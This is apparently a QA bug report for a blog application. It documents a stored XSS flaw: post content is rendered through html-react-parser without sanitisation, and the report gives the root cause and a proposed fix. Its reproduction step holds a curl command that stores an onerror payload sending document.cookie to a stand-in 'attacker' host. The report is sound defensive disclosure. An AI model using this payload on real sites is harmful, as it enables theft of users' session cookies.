# BUG-022 — Post content is rendered unsanitised — stored XSS

| Field | Value |
| --- | --- |
| Bug ID | BUG-022 |
| Title | Post content is rendered unsanitised — stored XSS |
| Severity | High |
| Priority | P1 |
| Status | OPEN |
| Feature | [FEAT-004](../../features/FEAT-004-article-reader/README.md) |
| Requirement | REQ-025 — **VIOLATED** |
| Reproducible | ALWAYS (storage proven); browser execution **NOT_EXECUTED** |
| Environment | Storage verified in-process against the real Mongoose schema; the render path verified by reading the source |
| Reported in | RUN-2026-10-07-001 |
| Test | TC-EDGE-003 (storage only) |
| Evidence | `automation/database/post-schema.test.js`, case `TC-EDGE-003` |
| Fix | Sanitise `post.content` with an allow-listing library before `parse()` |
| Regression test | Add a case asserting `<script>` and `on*` handlers are stripped from the rendered output |

## Observed behaviour

`TC-EDGE-003` stores `<img src=x onerror=alert(1)>` in `title` and a `<script>` element in
`content`. Mongoose accepts both and stores them **byte-identical**. There is no
sanitisation anywhere in the write path.

The reader renders it at `src/app/post/[slug]/page.js:246` with
`parse(post.content)` from `html-react-parser`, which converts HTML to React elements
without filtering.

## Expected behaviour

Hostile markup neutralised — either stripped on write or sanitised on read.

## Steps to reproduce

```bash
curl -s -X POST http://127.0.0.1:3000/api/posts \
  -H 'content-type: application/json' \
  -d '{"title":"x","slug":"xss-probe","featuredImage":"x","userId":"u",
       "content":"<p>hi</p><img src=x onerror=\"fetch(//attacker/?c=\x27+document.cookie)\"">"}'
# then open /post/xss-probe in a browser
```

## Root cause

Two absent controls:

1. **Write path.** `src/models/Post.js` has no `sanitize` transform on `content` or `title`,
   and `POST /api/posts` passes the body through untouched.
2. **Read path.** `app/post/[slug]/page.js:246` calls `parse(post.content)`. `html-react-parser`
   is a converter, not a sanitiser — it faithfully builds elements for whatever it is given.

Combined with BUG-004 (anyone can create a post) and BUG-006 (anyone can read one), this is
a complete stored-XSS chain that requires no account at all.

## Notes

**This is the one High-severity finding whose final link is unverified.** There is no browser
in this environment, so the payload was never rendered. What *is* proven:

* the markup survives validation and is stored verbatim (`TC-EDGE-003`, executed)
* the reader passes it to `parse()` at line 246 (read from source)

Whether `html-react-parser` executes the `onerror` handler in a real browser is the open
question. React generally does not attach inline event handlers from parsed HTML, so the
`<script>` route is the more likely vector — but that is reasoning, not measurement, and it
is marked as such. **Confirm in a browser before treating the severity as settled**, and see
[../../evidence/screenshots/README.md](../../evidence/screenshots/README.md) for how.

Even if the specific payload does not fire, the absence of any sanitisation on a field
rendered as HTML is the defect.
